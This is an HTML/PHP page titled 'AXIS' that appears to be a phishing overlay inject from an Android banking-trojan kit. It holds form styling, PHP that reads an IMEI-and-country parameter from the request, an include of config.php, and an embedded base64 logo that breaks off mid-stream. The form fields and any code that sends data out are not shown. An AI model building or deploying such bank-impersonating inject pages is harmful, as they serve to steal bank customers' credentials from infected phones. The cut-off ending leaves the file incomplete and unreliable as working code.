<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AXIS</title>

    <style>
        * {
            margin: 0;
            padding: 0;
			background: #e4e1d2;
        }

        .field-block {
            height: 35px;
            width: 97%;
            margin: 0 auto;
			margin-bottom: 2px;
            padding-top: 15px;
			background: #fff;
        }

        #content_div {
            text-align: center;
        }

        .input-field {
			border: 0;
			width: 75%;
			height: 25px;
			float: right;
			outline: none;
			background: #fff;
        }

        .rc-button {
            height: 50px;
            width: 200px;
            color: #ffffff;
            background: #5a6800 none repeat scroll 0 0;
			border-radius: 25px;
            border: none;
        }
		
		label {
			background: #fff;
			float: left;
			padding: 0 0 0 10px;
		}
		
        .fielderror {
			border: 0;
			width: 76%;
			height: 25px;
			outline: none;
			background: #fff;
            border-bottom: 1px solid #f00;
        }
    </style>
</head>

<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<img src="data:image/png;base64,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